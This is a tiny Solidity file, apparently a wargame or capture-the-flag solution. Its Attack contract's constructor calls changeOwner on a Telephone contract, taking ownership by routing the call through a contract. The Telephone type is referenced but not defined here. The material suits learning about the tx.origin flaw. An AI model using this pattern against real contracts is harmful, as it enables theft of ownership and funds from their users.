// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack{

    constructor(Telephone telephone){
        telephone.changeOwner(msg.sender);
    }
    
}